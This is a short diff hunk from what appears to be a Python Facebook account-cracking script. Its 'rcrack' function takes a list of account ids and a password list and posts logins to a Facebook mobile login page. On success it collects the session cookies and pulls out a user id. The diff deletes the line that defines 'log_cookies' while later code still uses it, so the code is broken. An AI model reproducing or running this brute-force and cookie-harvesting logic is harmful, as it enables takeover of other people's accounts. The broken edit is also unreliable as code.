@@ -1156,7 +1156,7 @@ def rcrack(ids,passlist):
             'sec-fetch-user': '?1',
             'user-agent': pro}
 			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+            
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[65:80]
